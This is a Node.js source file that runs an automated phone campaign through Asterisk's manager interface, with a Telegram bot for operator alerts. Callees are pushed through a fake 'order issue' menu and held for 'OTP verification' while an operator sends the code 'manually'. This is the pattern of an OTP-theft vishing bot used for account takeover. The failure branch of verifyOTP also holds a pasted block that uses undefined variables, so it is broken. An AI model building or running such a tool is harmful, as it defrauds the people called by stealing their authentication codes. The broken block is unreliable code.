const AMI = require("asterisk-manager");
const config = require("../config");
const Campaign = require("../models/campaign");
const Call = require("../models/call");
const {
  add_entry_to_database,
  add_other_entry_to_database,
  call_started,
  call_ended,
  pop_unprocessed_line,
} = require("../utils/entries");
const { get_settings } = require("../utils/settings");
const { get_bot } = require("../telegram_bot/botInstance");
const telegramQueue = require("../utils/telegramQueue");

const pressedNumbers = new Set();
const activeCalls = new Map(); // Store active call information
const pendingVerifications = new Map(); // Store calls waiting for OTP verification
const channelToPhoneMap = new Map(); // Map channels to phone numbers for DTMF lookup

const ami = new AMI(
  config.asterisk.port,
  config.asterisk.host,
  config.asterisk.username,
  config.asterisk.password,
  true
);
ami.keepConnected();

// Helper function for HTML escaping (safer than Markdown)
function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

ami.on("connect", () => {
  console.log("AMI is connected");
});

ami.on("error", (err) => {
  console.error("AMI Connection Error:", err);
});

ami.on("clear_pressed_numbers", () => {
  pressedNumbers.clear();
  channelToPhoneMap.clear();
  console.log("Cleared pressed numbers set and channel mapping for new campaign");
});

// Export verification functions for use by Telegram bot
function verifyOTP(callId, isValid) {
	console.log('######## verifyOTP ########', callId, isValid)
  const verification = pendingVerifications.get(callId);
  if (!verification) {
    console.log(`No pending verification found for call ID: ${callId}`);
    return false;
  }

  const { channel, phoneNumber } = verification;
  
  if (isValid) {
    // Redirect to verification success context
    ami.action({
      action: "Redirect",
      channel: channel,
      context: "verification-success",
      exten: "s",
      priority: 1
    }, (err, res) => {
      if (err) {
        console.error('Error redirecting to verification-success:', err);
      } else {
        console.log('Redirected to verification-success context');
      }
    });
    
    console.log(`OTP verified for ${phoneNumber}, redirecting to success context`);
  } else {
    // Redirect to verification failed context
    ami.action({
      action: "Redirect",
      channel: channel,
      context: "verification-failed",
      exten: "s",
      priority: 1
    }, (err, res) => {
      if (err) {
        console.error('Error redirecting to verification-failed:', err);
      } else {
        console.log('Redirected to verification-failed context');
      }
    });
    
	
	pressedNumbers.add(phoneNumber);
        
	// Generate unique call ID for this verification process
	const callId = `call_${phoneNumber}_${Date.now()}`;
	
	// Update call info
	callInfo.status = 'issue_reported';
	callInfo.dtmfPressed = '2';
	callInfo.callId = callId;
	
	// Store pending verification
	pendingVerifications.set(callId, {
	  phoneNumber: phoneNumber,
	  channel: channel,
	  timestamp: new Date(),
	  status: 'awaiting_otp'
	});
	
	console.log(`Created pending verification: ${callId} for ${phoneNumber} on ${channel}`);
	
	// Send message with inline keyboard for verification
	telegramQueue.sendMessage(
	  settings.notifications_chat_id,
	  adminMessage,
	  {
		parse_mode: "HTML",
		reply_markup: {
		  inline_keyboard: [
			[
			  { text: "✅ Verify OTP", callback_data: `verify_${callId}` },
			  { text: "❌ Invalid OTP", callback_data: `invalid_${callId}` }
			],
			[
			  { text: "📞 Hangup Call", callback_data: `hangup_${callId}` },
			  { text: "📋 Call Details", callback_data: `details_${callId}` }
			]
		  ]
		}
	  }
	);
	
    console.log(`OTP verification failed for ${phoneNumber}, redirecting to failed context`);
  }
  
  // Remove from pending verifications
  pendingVerifications.delete(callId);
  return true;
}

// Export function to get pending verifications (for admin interface)
function getPendingVerifications() {
  const pending = [];
  pendingVerifications.forEach((verification, callId) => {
    pending.push({
      callId,
      phoneNumber: verification.phoneNumber,
      timestamp: verification.timestamp,
      channel: verification.channel
    });
  });
  return pending;
}

ami.on("managerevent", async (data) => {
  const settings = get_settings();
  const bot = get_bot();
  
  // Track channel to phone number mapping for DTMF events
  if (data?.event === 'NewChannel' || data?.event === 'Newchannel') {
    const channel = data?.channel;
    const callerid = data?.calleridnum || data?.callerid;
    if (channel && callerid) {
      console.log(`Mapping channel ${channel} to phone ${callerid}`);
      channelToPhoneMap.set(channel, callerid);
    }
  }
  
  // Handle DTMF events with proper phone number resolution
  if (data?.event == "DTMFEnd") {
    let phoneNumber = data?.exten;
    const digit = data?.digit;
    const channel = data?.channel;
    
    // If exten is not the phone number, try to get it from channel mapping
    if (!phoneNumber || phoneNumber.length < 10) {
      phoneNumber = channelToPhoneMap.get(channel);
      console.log(`DTMF: exten was '${data?.exten}', using mapped phone number: ${phoneNumber}`);
    }
    
    if (!phoneNumber) {
      console.error(`Could not determine phone number for DTMF on channel ${channel}`);
      return;
    }
    
    console.log(`DTMF received: ${phoneNumber} pressed ${digit} on channel ${channel}`);
    
    // Store call information for reference
    if (!activeCalls.has(phoneNumber)) {
      activeCalls.set(phoneNumber, {
        channel: channel,
        phoneNumber: phoneNumber,
        startTime: new Date(),
        status: 'active'
      });
    }
    
    const callInfo = activeCalls.get(phoneNumber);
    
    if (digit === '1') {
      // Customer confirmed order - redirect to thank you context
      console.log(`${phoneNumber} confirmed order (pressed 1)`);
      
      if (!pressedNumbers.has(phoneNumber)) {
        pressedNumbers.add(phoneNumber);
        add_entry_to_database(phoneNumber, digit);
        
        // Update call status
        callInfo.status = 'order_confirmed';
        callInfo.dtmfPressed = '1';
        
        // Redirect to order confirmation context
        ami.action({
          action: "Redirect",
          channel: channel,
          context: "order-confirmed",
          exten: "s",
          priority: 1
        }, (err, res) => {
          if (err) {
            console.error('Error redirecting to order-confirmed:', err);
          } else {
            console.log('Redirected to order-confirmed context');
          }
        });
        
        // Update campaign statistics
        if (settings.campaign_id) {
          Campaign.increment('dtmfResponses', { where: { id: settings.campaign_id } });
        }
      }
    } 
    else if (digit === '2') {
      // Customer has issue - request OTP verification
      console.log(`${phoneNumber} has issue with order (pressed 2)`);
      
      if (!pressedNumbers.has(phoneNumber)) {
        pressedNumbers.add(phoneNumber);
        
        // Generate unique call ID for this verification process
        const callId = `call_${phoneNumber}_${Date.now()}`;
        
        // Update call info
        callInfo.status = 'issue_reported';
        callInfo.dtmfPressed = '2';
        callInfo.callId = callId;
        
        // Store pending verification
        pendingVerifications.set(callId, {
          phoneNumber: phoneNumber,
          channel: channel,
          timestamp: new Date(),
          status: 'awaiting_otp'
        });
        
        console.log(`Created pending verification: ${callId} for ${phoneNumber} on ${channel}`);
        
        // Redirect to OTP process context
        ami.action({
          action: "Redirect",
          channel: channel,
          context: "otp-process",
          exten: "s",
          priority: 1
        }, (err, res) => {
          if (err) {
            console.error('Error redirecting to otp-process:', err);
          } else {
            console.log('Redirected to otp-process context');
          }
        });
        
        // Log this as a different type of DTMF response
        add_other_entry_to_database(phoneNumber, digit);
        
        // Send notification to admin via Telegram
        const adminMessage = 
          `🚨 <b>ORDER ISSUE REPORTED</b>\n\n` +
          `📞 Phone: ${escapeHtml(phoneNumber)}\n` +
          `🆔 Call ID: <code>${escapeHtml(callId)}</code>\n` +
          `⏰ Time: ${escapeHtml(new Date().toLocaleString())}\n` +
          `📋 Status: Customer pressed 2 (has issue)\n\n` +
          `Customer is on hold waiting for OTP verification.\n` +
          `Please send OTP manually and use buttons below to verify.`;
        
        // Send message with inline keyboard for verification
        telegramQueue.sendMessage(
          settings.notifications_chat_id,
          adminMessage,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Verify OTP", callback_data: `verify_${callId}` },
                  { text: "❌ Invalid OTP", callback_data: `invalid_${callId}` }
                ],
                [
                  { text: "📞 Hangup Call", callback_data: `hangup_${callId}` },
                  { text: "📋 Call Details", callback_data: `details_${callId}` }
                ]
              ]
            }
          }
        );
        
        console.log(`Admin notified about issue from ${phoneNumber}, Call ID: ${callId}`);
      }
    }
    else if (digit === '9') {
      // Customer pressed 9 - they received OTP and ready for verification
      console.log(`${phoneNumber} pressed 9 - ready for OTP verification`, pendingVerifications);
      
      // Find the pending verification for this phone number
      let matchingCallId = null;
      let matchingVerification = null;
      
      for (const [callId, verification] of pendingVerifications.entries()) {
        console.log(`Checking verification: ${callId}, phone: ${verification.phoneNumber}, status: ${verification.status}`);
        if (verification.phoneNumber === phoneNumber && verification.status === 'awaiting_otp') {
          matchingCallId = callId;
          matchingVerification = verification;
          break;
        }
      }
      
      if (matchingCallId && matchingVerification) {
        console.log(`Found matching verification: ${matchingCallId} for ${phoneNumber}`);
        
        // Redirect to verification waiting context
        ami.action({
          action: "Redirect",
          channel: channel,
          context: "verification-waiting",
          exten: "s",
          priority: 1
        }, (err, res) => {
          if (err) {
            console.error('Error redirecting to verification-waiting:', err);
          } else {
            console.log('Redirected to verification-waiting context');
          }
        });
        
        // Update verification status
        matchingVerification.status = 'otp_entered';
        matchingVerification.otpEnteredTime = new Date();
        
        // Notify admin that customer entered OTP
        const otpEnteredMessage = 
          `✅ <b>OTP ENTERED</b>\n\n` +
          `📞 Phone: ${escapeHtml(phoneNumber)}\n` +
          `🆔 Call ID: <code>${escapeHtml(matchingCallId)}</code>\n` +
          `⏰ OTP Entered: ${escapeHtml(new Date().toLocaleString())}\n` +
          `📋 Customer pressed 9 - ready for verification\n\n` +
          `Please verify the OTP and click appropriate button:`;
        
        telegramQueue.sendMessage(
          settings.notifications_chat_id,
          otpEnteredMessage,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ OTP Valid - Verify", callback_data: `verify_${matchingCallId}` },
                  { text: "❌ OTP Invalid", callback_data: `invalid_${matchingCallId}` }
                ]
              ]
            }
          }
        );
      } else {
        console.log(`No pending verification found for ${phoneNumber} when they pressed 9`);
        console.log('Current pending verifications:');
        for (const [callId, verification] of pendingVerifications.entries()) {
          console.log(`  - ${callId}: ${verification.phoneNumber} (${verification.status})`);
        }
      }
    }
  }
  
  // Handle call originate responses with channel mapping
  if(data?.event === 'OriginateResponse'){
    if(data.response == 'Success'){
      const phoneNumber = data.exten == '' ? data.calleridnum : data.exten;
      const channel = data.channel;
      
      // Map the channel to phone number for DTMF lookup
      if (channel && phoneNumber) {
        channelToPhoneMap.set(channel, phoneNumber);
        console.log(`Mapped originate channel ${channel} to phone ${phoneNumber}`);
      }
      
      console.log(`Call answered on channel: ${channel} ${phoneNumber}`);
      call_started(phoneNumber);
      
      // Update successful calls counter
      if (settings.campaign_id) {
        Campaign.increment('successfulCalls', { where: { id: settings.campaign_id } });
      }
    }
    else{
      console.log(
        `Call to ${data?.exten} with +${data?.calleridnum} has ended with failed with reason ${data?.reason}`
      );
      call_ended(data?.exten, 'Failure');
      
      // Update failed calls counter
      if (settings.campaign_id) {
        Campaign.increment('failedCalls', { where: { id: settings.campaign_id } });
      }
      
      require("./call")(pop_unprocessed_line());
    }
  }

  // Handle hangup events with proper cleanup
  if (data?.event === "Hangup") {
	  const channel = data?.channel;
	  let phoneNumber = data?.exten;
	  const cause = data?.cause;
	  const causeTxt = data["cause-txt"];
	  
	  // Try to get phone number from channel mapping if exten is not available
	  if (!phoneNumber && channel) {
		phoneNumber = channelToPhoneMap.get(channel);
	  }
	  
	  if (phoneNumber) {
		console.log(`Call hangup for ${phoneNumber} on channel ${channel}, cause: ${cause} (${causeTxt})`);
		
		// Determine if this was a user hangup or system hangup
		const isUserHangup = cause === '16' || causeTxt === 'Normal Clearing';
		const isNoAnswer = cause === '19' || causeTxt === 'No Answer';
		const isBusy = cause === '17' || causeTxt === 'User busy';
		
		// Clean up channel mapping
		if (channel) {
		  channelToPhoneMap.delete(channel);
		}
		
		// Clean up call tracking
		if (activeCalls.has(phoneNumber)) {
		  const callInfo = activeCalls.get(phoneNumber);
		  const callDuration = (new Date() - callInfo.startTime) / 1000; // in seconds
		  
		  console.log(`Call ended for ${phoneNumber}, final status: ${callInfo.status}, duration: ${callDuration}s`);
		  
		  // Update call record in database with proper status
		  const updateData = {
			callEnded: new Date(),
			callStatus: callInfo.pressedOne ? 'success' : 'failed'
		  };
		  
		  // Mark as voicemail if no answer or very short call
		  if (isNoAnswer || (callDuration < 5 && !callInfo.dtmfPressed)) {
			updateData.callStatus = 'failed';
			updateData.voicemail = 'yes';
			
			// Increment voicemail counter
			if (settings.campaign_id) {
			  Campaign.increment('voicemailCalls', { where: { id: settings.campaign_id } });
			}
		  }
		  
		  // Update the call record
		  Call.update(updateData, {
			where: {
			  phoneNumber: `+${phoneNumber}`,
			  campaignId: settings.campaign_id
			}
		  });
		  
		  // Remove from active calls
		  activeCalls.delete(phoneNumber);
		  
		  // If there's a pending verification, clean it up
		  for (const [callId, verification] of pendingVerifications.entries()) {
			if (verification.phoneNumber === phoneNumber) {
			  console.log(`Cleaning up pending verification for ${phoneNumber}, Call ID: ${callId}`);
			  pendingVerifications.delete(callId);
			  
			  // Notify admin that call ended during verification process
			  if (verification.status !== 'completed') {
				telegramQueue.sendMessage(
				  settings.notifications_chat_id,
				  `⚠️ <b>Call Ended During Verification</b>\n\n` +
				  `📞 Phone: ${escapeHtml(phoneNumber)}\n` +
				  `🆔 Call ID: <code>${escapeHtml(callId)}</code>\n` +
				  `📋 Status: ${escapeHtml(verification.status)}\n` +
				  `⏰ Duration: ${callDuration.toFixed(1)}s\n` +
				  `🔚 Cause: ${escapeHtml(causeTxt)}`,
				  { parse_mode: "HTML" }
				);
			  }
			  break;
			}
		  }
		}
		
		call_ended(phoneNumber, isUserHangup ? 'User Hangup' : causeTxt);
		console.log(
		  `Call to ${phoneNumber} has ended with cause ${cause}: ${causeTxt}`
		);
		require("./call")(pop_unprocessed_line());
	  } else {
		console.log(`Hangup event but could not determine phone number for channel ${channel}`);
	  }
	}
});

function waitForConnection() {
  return new Promise((resolve) => {
    const check = setInterval(() => {
      if (ami.connected) {
        clearInterval(check);
        resolve();
      }
    }, 1000);
  });
}

module.exports = { 
  ami, 
  waitForConnection, 
  verifyOTP, 
  getPendingVerifications,
  activeCalls,
  pendingVerifications,
  channelToPhoneMap
};